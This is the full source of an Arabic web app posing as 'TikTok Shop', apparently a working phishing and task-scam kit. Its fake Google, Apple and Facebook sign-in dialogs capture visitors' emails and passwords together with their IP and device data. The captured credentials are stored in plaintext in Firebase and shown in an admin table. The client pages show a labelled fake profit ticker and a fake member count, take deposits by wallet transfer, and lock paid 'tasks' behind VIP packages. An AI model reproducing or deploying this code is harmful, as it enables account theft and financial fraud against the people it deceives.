<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Shop - Fixed Admin Mobile</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue, remove, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC5zPaTAAU5lPCZ7LstSQ8J9IWmkQrpcMg",
            authDomain: "tiktokshop-9fd63.firebaseapp.com",
            projectId: "tiktokshop-9fd63",
            storageBucket: "tiktokshop-9fd63.firebasestorage.app",
            messagingSenderId: "1008538085856",
            appId: "1:1008538085856:web:83caa9dc0d7444e12c2385",
            measurementId: "G-1NSG64V4D4"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.db = db;
        window.ref = ref;
        window.set = set;
        window.get = get;
        window.update = update;
        window.remove = remove;
        window.onValue = onValue;
        window.push = push;

        console.log("System Ready");
        initializeAppLogic();
    </script>

    <style>
        body { font-family: 'Tajawal', sans-serif; user-select: none; background-color: #f3f4f6; margin: 0; padding: 0; }
        .hidden { display: none !important; }
        
        /* Login Styles */
        .auth-bg { background: #fff; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .social-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; border: 1px solid #ddd; background: white; color: #333; position: relative; }
        .social-btn img, .social-btn i { position: absolute; right: 15px; width: 20px; font-size: 18px; }

        /* Simulation Modal */
        .sim-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 200; display: flex; justify-content: center; align-items: center; }
        .sim-content { background: white; width: 90%; max-width: 350px; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        .sim-input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; margin-bottom: 10px; text-align: center; }
        .sim-btn { width: 100%; padding: 10px; border-radius: 6px; color: white; font-weight: bold; background: #2563eb; }

        /* --- ADMIN LAYOUT FIX (Responsive) --- */
        .admin-wrapper { display: flex; flex-direction: column; min-height: 100vh; }
        
        /* Header (Mobile Only) */
        .admin-header { 
            display: none; 
            background: white; padding: 15px; 
            justify-content: space-between; align-items: center; 
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            position: sticky; top: 0; z-index: 40;
        }

        /* Sidebar */
        .admin-sidebar {
            width: 260px;
            background: #1f2937;
            color: white;
            position: fixed;
            top: 0; right: 0; bottom: 0;
            z-index: 100;
            transition: transform 0.3s ease-in-out;
            padding: 20px;
            overflow-y: auto;
        }

        .admin-content {
            flex: 1;
            background: #f3f4f6;
            padding: 20px;
            margin-right: 260px; /* Default desktop margin */
            transition: margin 0.3s;
        }

        /* Mobile Styles */
        @media (max-width: 768px) {
            .admin-header { display: flex; }
            .admin-sidebar { transform: translateX(100%); right: 0; } /* Hide sidebar to right */
            .admin-sidebar.active { transform: translateX(0); } /* Show sidebar */
            .admin-content { margin-right: 0; padding: 10px; }
            
            /* Overlay when menu is open */
            .sidebar-overlay {
                position: fixed; top: 0; left: 0; right: 0; bottom: 0;
                background: rgba(0,0,0,0.5); z-index: 90; display: none;
            }
            .sidebar-overlay.active { display: block; }
        }

        .admin-nav-item { display: flex; items-center; padding: 12px; margin-bottom: 5px; border-radius: 8px; cursor: pointer; color: #9ca3af; transition: 0.2s; }
        .admin-nav-item.active, .admin-nav-item:hover { background: #374151; color: #fbbf24; }
        .admin-nav-item i { margin-left: 12px; width: 20px; text-align: center; }
        
        /* Improved Table */
        .table-container { overflow-x: auto; -webkit-overflow-scrolling: touch; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .custom-table { width: 100%; background: white; font-size: 13px; border-collapse: collapse; min-width: 600px; /* Force scroll on mobile */ }
        .custom-table th { background: #f9fafb; padding: 12px; text-align: right; color: #6b7280; border-bottom: 1px solid #e5e7eb; white-space: nowrap; }
        .custom-table td { padding: 12px; border-bottom: 1px solid #f3f4f6; color: #1f2937; white-space: nowrap; }
        
        .stat-card { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); margin-bottom: 10px; }
        .modal-box { background: white; padding: 20px; border-radius: 15px; width: 90%; max-width: 400px; position: relative; max-height: 90vh; overflow-y: auto; }
        .loader { border: 4px solid #f3f3f3; border-radius: 50%; border-top: 4px solid #000; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading-overlay" class="fixed inset-0 bg-white z-[999] flex flex-col items-center justify-center">
        <div class="loader mb-4"></div>
        <p class="text-sm text-gray-500 font-bold">جاري التحميل...</p>
    </div>

    <div id="auth-screen" class="auth-bg hidden z-50">
        <div class="w-full max-w-sm text-center">
            <div class="w-20 h-20 bg-black text-white rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-xl"><i class="fa-brands fa-tiktok text-4xl"></i></div>
            <h1 class="text-3xl font-bold text-gray-900 mb-2">تسجيل الدخول</h1>
            <p class="text-gray-500 mb-8 text-sm">قم بإدارة أرباحك ومتجرك بسهولة</p>

            <div onclick="openSimulation('google')" class="social-btn border-gray-300"><img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg"> المتابعة باستخدام Google</div>
            <div onclick="openSimulation('apple')" class="social-btn bg-black text-white border-black hover:bg-gray-800"><i class="fa-brands fa-apple"></i> المتابعة باستخدام Apple</div>
            <div onclick="openSimulation('facebook')" class="social-btn bg-blue-600 text-white border-blue-600 hover:bg-blue-700"><i class="fa-brands fa-facebook-f"></i> المتابعة باستخدام Facebook</div>

            <div class="mt-8 cursor-pointer text-gray-400 text-xs" onclick="adminLoginPrompt()">دخول الإدارة</div>
        </div>
    </div>

    <div id="sim-modal" class="sim-modal hidden">
        <div class="sim-content relative">
            <i onclick="closeSimulation()" class="fa-solid fa-xmark absolute top-3 left-3 cursor-pointer text-gray-400 hover:text-gray-600 text-xl"></i>
            <div class="mb-6 text-center"><img id="sim-logo" src="" class="w-12 mx-auto mb-3"><h3 id="sim-title" class="font-bold text-lg text-gray-800">تسجيل الدخول</h3></div>
            <input type="email" id="sim-email" class="sim-input" placeholder="البريد الإلكتروني"><input type="password" id="sim-pass" class="sim-input" placeholder="كلمة المرور"><input type="hidden" id="sim-provider">
            <button onclick="submitSimulation()" id="sim-btn" class="sim-btn">متابعة</button>
        </div>
    </div>

    <div id="admin-panel" class="hidden admin-wrapper">
        
        <div class="sidebar-overlay" onclick="toggleSidebar()"></div>

        <div class="admin-header md:hidden">
            <div class="flex items-center gap-2">
                <button onclick="toggleSidebar()" class="text-2xl text-gray-700"><i class="fa-solid fa-bars"></i></button>
                <span class="font-bold text-lg">لوحة التحكم</span>
            </div>
            <div class="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center text-white font-bold">A</div>
        </div>

        <aside class="admin-sidebar" id="admin-sidebar">
            <div class="flex items-center justify-between mb-8">
                <div class="text-xl font-bold text-yellow-400 flex items-center gap-2"><i class="fa-solid fa-shield-halved"></i> Admin Pro</div>
                <i class="fa-solid fa-xmark md:hidden cursor-pointer" onclick="toggleSidebar()"></i>
            </div>
            <nav>
                <div onclick="showAdminTab('dashboard')" class="admin-nav-item active" id="nav-dashboard"><i class="fa-solid fa-chart-pie"></i> <span>الرئيسية</span></div>
                <div onclick="showAdminTab('users')" class="admin-nav-item" id="nav-users"><i class="fa-solid fa-users"></i> <span>العملاء</span></div>
                <div onclick="showAdminTab('tasks')" class="admin-nav-item" id="nav-tasks"><i class="fa-solid fa-list-check"></i> <span>المهام</span></div>
                <div onclick="showAdminTab('signatures')" class="admin-nav-item" id="nav-signatures"><i class="fa-solid fa-gem"></i> <span>الباقات</span></div>
                <div onclick="showAdminTab('requests')" class="admin-nav-item" id="nav-requests"><i class="fa-solid fa-money-bill-transfer"></i> <span>المالية</span></div>
                <div onclick="showAdminTab('support')" class="admin-nav-item" id="nav-support"><i class="fa-solid fa-headset"></i> <span>الدعم</span></div>
                <div onclick="showAdminTab('settings')" class="admin-nav-item" id="nav-settings"><i class="fa-solid fa-gear"></i> <span>الإعدادات</span></div>
                <div onclick="logout()" class="admin-nav-item text-red-400 mt-6"><i class="fa-solid fa-right-from-bracket"></i> <span>خروج</span></div>
            </nav>
        </aside>

        <main class="admin-content">
            
            <div id="admin-dashboard-sec" class="admin-section">
                <h2 class="text-2xl font-bold text-gray-800 mb-4 hidden md:block">لوحة المعلومات</h2>
                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                    <div class="bg-white p-5 rounded-xl shadow-sm border-r-4 border-blue-500 flex justify-between items-center"><div><p class="text-gray-500 text-sm font-bold">العملاء</p><h3 class="text-2xl font-bold text-gray-800" id="stat-total-users">0</h3></div><i class="fa-solid fa-users text-3xl text-blue-100 text-blue-500"></i></div>
                    <div class="bg-white p-5 rounded-xl shadow-sm border-r-4 border-green-500 flex justify-between items-center"><div><p class="text-gray-500 text-sm font-bold">الأموال</p><h3 class="text-2xl font-bold text-green-600" id="stat-total-balance">0</h3></div><i class="fa-solid fa-wallet text-3xl text-green-100 text-green-500"></i></div>
                    <div class="bg-white p-5 rounded-xl shadow-sm border-r-4 border-orange-500 flex justify-between items-center"><div><p class="text-gray-500 text-sm font-bold">الطلبات</p><h3 class="text-2xl font-bold text-orange-500" id="stat-pending-req">0</h3></div><i class="fa-solid fa-clock text-3xl text-orange-100 text-orange-500"></i></div>
                </div>
            </div>
            
            <div id="admin-users-sec" class="hidden admin-section">
                <h2 class="text-xl font-bold text-gray-800 mb-4">إدارة العملاء</h2>
                <div class="bg-white p-4 rounded-xl shadow-sm">
                    <input type="text" id="search-user" onkeyup="searchUsers()" placeholder="بحث برقم الهاتف..." class="w-full border p-2 rounded-lg text-sm bg-gray-50 mb-4">
                    <div class="table-container">
                        <table class="custom-table">
                            <thead><tr><th>العميل</th><th>البيانات</th><th>الرصيد</th><th>الجهاز</th><th>تحكم</th></tr></thead>
                            <tbody id="admin-users-list"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <div id="admin-tasks-sec" class="hidden admin-section">
                <div class="flex justify-between items-center mb-4"><h3 class="font-bold text-lg">المهام</h3><button onclick="saveAdminTasks()" class="bg-green-600 text-white px-3 py-1.5 rounded text-sm">حفظ التغييرات</button></div>
                <div id="admin-tasks-container" class="space-y-3"></div>
            </div>

            <div id="admin-signatures-sec" class="hidden admin-section">
                <div class="flex justify-between items-center mb-4"><h3 class="font-bold text-lg">الباقات</h3><button onclick="saveAdminSignatures()" class="bg-green-600 text-white px-3 py-1.5 rounded text-sm">حفظ</button></div>
                <div id="admin-signatures-container" class="space-y-3"></div>
                <button onclick="addNewSignature()" class="mt-4 w-full bg-orange-100 text-orange-600 py-2 rounded-lg font-bold border border-orange-200">+ إضافة باقة</button>
            </div>

            <div id="admin-requests-sec" class="hidden admin-section">
                <h2 class="text-xl font-bold text-gray-800 mb-4">طلبات الشحن</h2>
                <div class="bg-white rounded-xl shadow-sm p-4 table-container">
                    <table class="custom-table"><thead><tr><th>المرسل</th><th>المبلغ</th><th>الصورة</th><th>الإجراء</th></tr></thead><tbody id="admin-requests-list"></tbody></table>
                </div>
            </div>

            <div id="admin-support-sec" class="hidden admin-section">
                <h2 class="text-xl font-bold text-gray-800 mb-4">رسائل الدعم</h2>
                <div class="bg-white rounded-xl shadow-sm p-4 table-container">
                    <table class="custom-table"><thead><tr><th>العميل</th><th>الرسالة</th><th>الرد</th></tr></thead><tbody id="admin-support-list"></tbody></table>
                </div>
            </div>

            <div id="admin-settings-sec" class="hidden admin-section">
                <div class="bg-white p-6 rounded-xl shadow-sm max-w-lg mx-auto">
                    <h3 class="font-bold mb-4 text-lg border-b pb-2">إعدادات الموقع</h3>
                    <div class="space-y-4">
                        <div><label class="block text-xs font-bold text-gray-500 mb-1">رقم المحفظة</label><input type="text" id="setting-cash-number" class="w-full border p-2 rounded bg-gray-50"></div>
                        <div><label class="block text-xs font-bold text-gray-500 mb-1">رابط الدعم</label><input type="text" id="setting-support-link" class="w-full border p-2 rounded bg-gray-50"></div>
                        <div><label class="block text-xs font-bold text-gray-500 mb-1">شريط الإعلانات</label><input type="text" id="setting-announcement" class="w-full border p-2 rounded bg-gray-50"></div>
                        <button onclick="saveSiteSettings()" class="w-full bg-gray-900 text-white py-2 rounded font-bold mt-2">حفظ الإعدادات</button>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <div id="client-app" class="hidden relative pb-20 bg-gray-50 min-h-screen">
        <div id="recharge-modal" class="modal-overlay hidden">
            <div class="modal-box">
                <button onclick="closeRechargeModal()" class="absolute top-2 left-3 text-2xl font-bold text-gray-700">&times;</button>
                <h3 class="text-xl font-bold mb-4 text-gray-800">شحن الرصيد</h3>
                <div id="recharge-rejected-alert" class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mb-4 hidden text-right"><strong class="font-bold block mb-1">تم رفض طلبك!</strong><span class="text-sm block" id="recharge-rejection-reason"></span></div>
                <div class="bg-yellow-50 p-3 rounded text-sm mb-4 text-yellow-800 font-bold border border-yellow-200"><p class="mb-2">تحويل إلى:</p><div class="flex items-center justify-center gap-3 bg-white p-2 rounded-lg border border-yellow-300 shadow-sm mt-1"><span id="recharge-admin-number" class="text-xl text-black font-mono font-bold tracking-wider">...</span><button onclick="copyToClipboard()" class="text-gray-500 hover:text-blue-600 transition"><i id="copy-icon" class="fa-regular fa-copy text-xl"></i></button></div></div>
                <input type="number" id="charge-amount" class="w-full p-2 border rounded mb-2 bg-gray-50 text-right" placeholder="المبلغ">
                <input type="text" id="charge-name" class="w-full p-2 border rounded mb-2 bg-gray-50 text-right" placeholder="اسم المحول">
                <input type="text" id="charge-sender" class="w-full p-2 border rounded mb-2 bg-gray-50 text-right" placeholder="رقم المحفظة">
                <input type="file" id="recharge-file-input" class="hidden" accept="image/*" onchange="handleFileSelect(event)">
                <label for="recharge-file-input" class="flex flex-col items-center justify-center border-2 border-dashed border-gray-300 p-4 rounded mb-4 cursor-pointer hover:bg-gray-100"><i id="upload-icon" class="fa-solid fa-cloud-upload text-3xl text-gray-400 mb-2"></i><span id="upload-text" class="text-xs text-gray-500 mt-1">صورة التحويل</span><img id="upload-preview" src="" class="hidden w-full h-20 object-cover rounded mt-2"></label>
                <button onclick="submitRechargeRequest()" class="w-full bg-black text-white py-3 rounded-lg font-bold shadow-lg">إرسال الطلب</button>
            </div>
        </div>

        <div id="home-page" class="fade-in p-4">
            <header class="flex justify-between items-center mb-4 pt-2">
                <div class="flex items-center gap-2"><div class="w-10 h-10 bg-yellow-400 rounded-full flex items-center justify-center font-bold text-white"><i class="fa-solid fa-user"></i></div><div><h2 class="font-bold text-sm" id="home-user-name">User</h2><p class="text-xs text-gray-500">عضو نشط</p></div></div>
                <i onclick="logout()" class="fa-solid fa-right-from-bracket text-red-500 cursor-pointer"></i>
            </header>
            <div class="bg-blue-600 text-white text-center py-2 px-2 mb-4 shadow-lg text-sm font-bold rounded-lg overflow-hidden whitespace-nowrap"><span id="announcement-display-text" class="animate-marquee">...</span></div>
            <div class="slider-container rounded-xl overflow-hidden shadow-md mb-6 h-40 relative"><div class="slide active" style="background-image: url('https://images.unsplash.com/photo-1607082348824-0a96f2a4b9da?w=800');"></div><div class="slide" style="background-image: url('https://images.unsplash.com/photo-1483985988355-763728e1935b?w=800');"></div></div>
            <div class="grid grid-cols-2 gap-4 mb-6">
                <div onclick="openRechargeModal()" class="bg-white p-4 rounded-xl shadow-sm text-center border active:scale-95 transition"><div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-2 text-blue-600"><i class="fa-solid fa-wallet"></i></div><h3 class="font-bold text-sm">شحن</h3></div>
                <div class="bg-white p-4 rounded-xl shadow-sm text-center border"><div class="w-12 h-12 bg-yellow-50 rounded-full flex items-center justify-center mx-auto mb-2 text-yellow-600"><i class="fa-solid fa-sack-dollar"></i></div><h3 class="font-bold text-sm">سحوبات</h3><div id="fake-profit-ticker" class="h-8 overflow-hidden relative mt-1"></div></div>
            </div>
            <div class="mt-4 text-center pt-2 border-t"><p class="text-gray-400 text-xs font-bold">الأعضاء النشطين</p><div class="flex justify-center items-center gap-2 text-gray-800"><i class="fa-solid fa-users text-blue-500"></i><p class="text-xl font-bold" id="fake-user-count">54,230</p></div></div>
        </div>

        <div id="work-page" class="hidden fade-in min-h-screen bg-gray-50 p-4 pb-24">
            <h2 class="font-bold text-xl mb-4">المهام اليومية</h2>
            <div id="sign-alert" class="bg-white p-6 rounded-xl shadow text-center hidden"><i class="fa-solid fa-lock text-red-500 text-3xl mb-2 block"></i><p>يجب الاشتراك في باقة</p><button onclick="switchTab('signature-page', document.getElementById('nav-sign'))" class="bg-black text-white px-4 py-2 rounded mt-2 text-sm">الباقات</button></div>
            <div id="task-area" class="bg-white p-6 rounded-2xl shadow-md text-center">
                <div id="frozen-message" class="hidden p-4 bg-yellow-50 border border-yellow-200 rounded mb-4"><p class="text-yellow-800 font-bold text-sm">قيد المراجعة من المدير</p></div>
                <img id="task-img" src="" class="w-24 h-24 mx-auto rounded-lg mb-4 object-cover">
                <h3 id="task-name" class="font-bold text-lg mb-2">...</h3>
                <p class="text-gray-500 text-sm mb-4">العمولة: <span id="task-commission" class="text-green-600 font-bold">0</span> ج.م</p>
                <button onclick="processTask()" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold shadow-lg active:scale-95">تنفيذ المهمة</button>
                <p class="text-xs text-gray-400 mt-3">المهمة رقم: <span id="task-counter">1</span></p>
            </div>
        </div>

        <div id="signature-page" class="hidden fade-in p-4 pb-24"><h2 class="text-center font-bold text-xl mb-6">الباقات</h2><div id="signature-list" class="space-y-4"></div></div>
        <div id="profile-page" class="hidden fade-in min-h-screen bg-white pb-24">
            <div class="bg-yellow-400 p-6 rounded-b-[3rem] shadow-sm mb-6">
                <div class="flex flex-col items-center gap-3 mb-6"><div class="w-20 h-20 bg-white rounded-full flex items-center justify-center text-3xl font-bold text-yellow-600"><i class="fa-solid fa-user"></i></div><h2 id="profile-name" class="font-bold text-2xl text-black">User</h2></div>
                <div class="bg-white/90 backdrop-blur rounded-2xl p-4 flex justify-between text-center shadow-lg mx-4"><div><span class="block text-xs text-gray-500">الرصيد</span><span id="profile-balance" class="text-xl font-bold">0.00</span></div><div><span class="block text-xs text-gray-500">الربح</span><span id="profile-total-income" class="text-xl font-bold text-green-600">0.00</span></div></div>
            </div>
            <div class="px-6 space-y-3"><button onclick="attemptWithdraw()" class="w-full bg-gray-900 text-white py-3 rounded-xl font-bold shadow-lg">سحب</button><button onclick="logout()" class="w-full border border-red-200 text-red-500 py-3 rounded-xl font-bold">خروج</button></div>
        </div>
        <div id="support-page" class="hidden fade-in p-4 pb-24"><h2 class="font-bold text-xl mb-4 text-center">الدعم</h2><div id="client-support-history" class="mb-4 space-y-3 max-h-[50vh] overflow-y-auto p-2 bg-gray-100 rounded-lg"></div><textarea id="support-msg-input" rows="3" class="w-full p-3 border rounded-lg mb-2" placeholder="رسالتك..."></textarea><button onclick="sendSupportMessage()" class="w-full bg-purple-600 text-white py-3 rounded-lg font-bold">إرسال</button></div>
        <div id="history-page" class="hidden fade-in text-center pt-20"><i class="fa-solid fa-box-open text-6xl text-gray-200 mb-4"></i><p class="text-gray-400">لا سجلات</p></div>

        <nav id="bottom-nav" class="hidden fixed bottom-0 left-0 w-full bg-white border-t border-gray-100 flex justify-around py-3 pb-6 z-40 rounded-t-2xl shadow-2xl">
            <div id="nav-home" onclick="switchTab('home-page', this)" class="nav-item active text-center cursor-pointer w-1/5"><i class="fa-solid fa-house text-xl mb-1 block"></i><span class="text-[10px] font-bold">الرئيسية</span></div>
            <div id="nav-sign" onclick="switchTab('signature-page', this)" class="nav-item text-center cursor-pointer w-1/5"><i class="fa-solid fa-crown text-xl mb-1 block"></i><span class="text-[10px] font-bold">الباقات</span></div>
            <div id="nav-work" onclick="switchTab('work-page', this)" class="nav-item text-center cursor-pointer w-1/5 relative"><div class="absolute -top-8 left-1/2 transform -translate-x-1/2 bg-black w-12 h-12 rounded-full flex items-center justify-center border-4 border-white shadow-xl text-white"><i class="fa-solid fa-play text-lg"></i></div><span class="text-[10px] font-bold mt-6 block">العمل</span></div>
            <div id="nav-hist" onclick="switchTab('history-page', this)" class="nav-item text-center cursor-pointer w-1/5"><i class="fa-solid fa-clock-rotate-left text-xl mb-1 block"></i><span class="text-[10px] font-bold">السجل</span></div>
            <div id="nav-prof" onclick="switchTab('profile-page', this)" class="nav-item text-center cursor-pointer w-1/5"><i class="fa-solid fa-user text-xl mb-1 block"></i><span class="text-[10px] font-bold">حسابي</span></div>
        </nav>
    </div>

    <script>
        let tasks=[], currentUser=null, allUsers=[], allRequests=[], supportMessages=[], siteSettings={}, signatures=[];
        
        function initializeAppLogic() {
            setTimeout(() => {
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('auth-screen').classList.remove('hidden');
                setupListeners();
                startFakeTicker(); startImageSlider(); startFakeUserCount();
            }, 1500);
        }

        function setupListeners() {
            window.onValue(window.ref(window.db, 'tasks'), (s) => { if(s.val()) tasks=Object.values(s.val()); else seedTasks(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminTasksUI(); });
            window.onValue(window.ref(window.db, 'users'), (s) => { if(s.val()) allUsers=Object.values(s.val()); updateDashboardStats(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminUsersUI(); });
            window.onValue(window.ref(window.db, 'signatures'), (s) => { if(s.val()) signatures=s.val(); else seedSignatures(); renderSignatures(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminSignaturesUI(); });
            window.onValue(window.ref(window.db, 'recharge_requests'), (s) => { if(s.val()) allRequests=Object.entries(s.val()).map(([k,v])=>({id:k,...v})); updateDashboardStats(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminRequestsUI(); });
            window.onValue(window.ref(window.db, 'settings'), (s) => { siteSettings=s.val()||{vodafoneCashNumber:'010',siteAnnouncement:'Welcome',supportLink:'#'}; updateClientSettingsUI(); });
            window.onValue(window.ref(window.db, 'support_messages'), (s) => { if(s.val()) { supportMessages=Object.entries(s.val()).map(([k,v])=>({id:k,...v})); if(currentUser && !document.getElementById('client-app').classList.contains('hidden')) renderClientSupportHistory(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminSupportUI(); } });
        }

        function seedTasks() { let t=[]; for(let i=1;i<=24;i++) t.push({id:i, name:`مهمة تجارية ${i}`, price:i*100, commission:i*10, img:`https://source.unsplash.com/random/200x200?sig=${i}`}); window.set(window.ref(window.db,'tasks'), t); }
        function seedSignatures() { let s=[{name:"VIP 1",price:300,img:""},{name:"VIP 2",price:500,img:""},{name:"VIP 3",price:1000,img:""}]; window.set(window.ref(window.db,'signatures'), s); }

        // --- Simulation ---
        window.openSimulation = (p) => {
            const m=document.getElementById('sim-modal'); m.classList.remove('hidden');
            const l=document.getElementById('sim-logo'), t=document.getElementById('sim-title'), b=document.getElementById('sim-btn');
            document.getElementById('sim-email').value=''; document.getElementById('sim-pass').value=''; document.getElementById('sim-provider').value=p;
            if(p==='google'){l.src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg";t.innerText="Google";b.style.background="#1a73e8";}
            else if(p==='facebook'){l.src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png";t.innerText="Facebook";b.style.background="#1877f2";}
            else{l.src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg";t.innerText="Apple ID";b.style.background="black";}
        };
        window.closeSimulation = () => document.getElementById('sim-modal').classList.add('hidden');
        window.submitSimulation = async () => {
            const e=document.getElementById('sim-email').value, p=document.getElementById('sim-pass').value, pr=document.getElementById('sim-provider').value;
            if(!e||!p) return alert("بيانات ناقصة"); window.closeSimulation(); document.getElementById('loading-overlay').classList.remove('hidden');
            let ip='Unknown'; try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();ip=d.ip;}catch(e){}
            const k=e.replace(/[.#$[\]]/g,'_'), uid=Math.floor(100000+Math.random()*900000), inv=Math.random().toString(36).substring(2,8).toUpperCase(), jd=new Date().toLocaleDateString('ar-EG');
            const u={name:e.split('@')[0], email:e, password:p, provider:pr, balance:0, totalIncome:0, currentTaskIndex:1, ip:ip, device:navigator.userAgent, isBanned:false, isSigned:false, uid:uid, inviteCode:inv, joinDate:jd};
            window.set(window.ref(window.db,'users/'+k),u).then(()=>{currentUser=u; finalizeLogin();});
        };

        // --- Admin Auth & Logic ---
        window.adminLoginPrompt = () => { if(prompt("كود المسؤول:")==="mohy123") { document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('admin-panel').classList.remove('hidden'); showAdminTab('users'); } };
        window.toggleSidebar = () => { document.getElementById('admin-sidebar').classList.toggle('active'); document.querySelector('.sidebar-overlay').classList.toggle('active'); };
        
        window.showAdminTab = (t) => {
            document.querySelectorAll('.admin-section').forEach(e=>e.classList.add('hidden'));
            document.querySelectorAll('.admin-nav-item').forEach(e=>e.classList.remove('active'));
            document.getElementById(`admin-${t}-sec`).classList.remove('hidden');
            if(document.getElementById(`nav-${t}`)) document.getElementById(`nav-${t}`).classList.add('active');
            if(window.innerWidth<=768) window.toggleSidebar(); // Close on mobile
            if(t==='users') renderAdminUsersUI();
            if(t==='tasks') renderAdminTasksUI();
            if(t==='signatures') renderAdminSignaturesUI();
            if(t==='requests') renderAdminRequestsUI();
            if(t==='support') renderAdminSupportUI();
            if(t==='settings') renderAdminSettingsUI();
        };

        function renderAdminUsersUI(f='') {
            let h=''; allUsers.filter(u=>(u.phone||u.email).includes(f)).forEach(u=>{
                let k=(u.email||u.phone).replace(/[.#$[\]]/g,'_');
                let b=u.isBanned?`<button onclick="unbanUser('${k}')" class="text-gray-500 bg-gray-100 px-2 rounded text-xs">فك</button>`:`<button onclick="banUser('${k}')" class="text-red-500 bg-red-100 px-2 rounded text-xs">حظر</button>`;
                let d=u.isTaskFrozen?`<button onclick="unlockTask('${k}',${u.currentTaskIndex})" class="text-yellow-600 bg-yellow-100 px-2 rounded text-xs mx-1">فتح</button>`:'';
                h+=`<tr><td>${u.name}<br><span class="text-xs text-gray-400">${u.email||u.phone}</span></td><td class="text-xs">${u.password}<br>${u.provider||'Phone'}</td><td class="font-bold text-green-600">${u.balance}</td><td class="text-xs text-gray-400 truncate max-w-[80px]">${u.device}</td><td>${b}${d}<button onclick="deleteUser('${k}')" class="text-red-600 mx-1"><i class="fa-solid fa-trash"></i></button></td></tr>`;
            }); document.getElementById('admin-users-list').innerHTML=h;
        }
        window.searchUsers = () => renderAdminUsersUI(document.getElementById('search-user').value);
        window.banUser = (k) => { if(confirm("حظر؟")) window.update(window.ref(window.db,`users/${k}`),{isBanned:true}); };
        window.unbanUser = (k) => { window.update(window.ref(window.db,`users/${k}`),{isBanned:false}); };
        window.deleteUser = (k) => { if(confirm("حذف؟")) window.remove(window.ref(window.db,`users/${k}`)); };
        window.unlockTask = (k,i) => { if(confirm("فتح؟")) window.update(window.ref(window.db,`users/${k}`),{isTaskFrozen:false, currentTaskIndex:i+1}); };

        function renderAdminTasksUI() { const c=document.getElementById('admin-tasks-container'); c.innerHTML=''; tasks.forEach((t,i)=>{ c.innerHTML+=`<div class="bg-white border p-2 rounded flex gap-2 items-center text-sm"><span class="w-5 font-bold text-gray-400">${i+1}</span><input id="tn-${i}" value="${t.name}" class="border p-1 rounded w-1/3"><input id="tp-${i}" value="${t.price}" class="border p-1 rounded w-16 text-center"><input id="tc-${i}" value="${t.commission}" class="border p-1 rounded w-16 text-center"><input id="ti-${i}" value="${t.img}" class="border p-1 rounded flex-1"></div>`; }); }
        window.saveAdminTasks = () => { let u=[]; for(let i=0;i<tasks.length;i++) u.push({id:i+1, name:document.getElementById(`tn-${i}`).value, price:parseFloat(document.getElementById(`tp-${i}`).value), commission:parseFloat(document.getElementById(`tc-${i}`).value), img:document.getElementById(`ti-${i}`).value}); window.set(window.ref(window.db,'tasks'), u).then(()=>alert("تم")); };

        function renderAdminRequestsUI() { let h=''; allRequests.filter(r=>r.status==='pending').forEach(r=>{ h+=`<tr><td>${r.senderName}</td><td class="text-green-600 font-bold">${r.amount}</td><td><a href="#" class="text-blue-500 text-xs" onclick="alert('${r.fileName}')">عرض</a></td><td><button onclick="approveReq('${r.id}','${r.userPhone}',${r.amount})" class="text-green-500">✔</button></td></tr>`; }); document.getElementById('admin-requests-list').innerHTML=h||'<tr><td colspan="4" class="text-center text-gray-400 py-4">لا طلبات</td></tr>'; }
        window.approveReq = (id,p,a) => { window.update(window.ref(window.db,`recharge_requests/${id}`),{status:'approved'}); window.get(window.ref(window.db,`users/${p}`)).then(s=>window.update(window.ref(window.db,`users/${p}`),{balance:(s.val().balance||0)+a})); };

        // ... (Other Client/Admin logic similar to previous code)
        function finalizeLogin() { document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('client-app').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden'); updateAppUI(); }
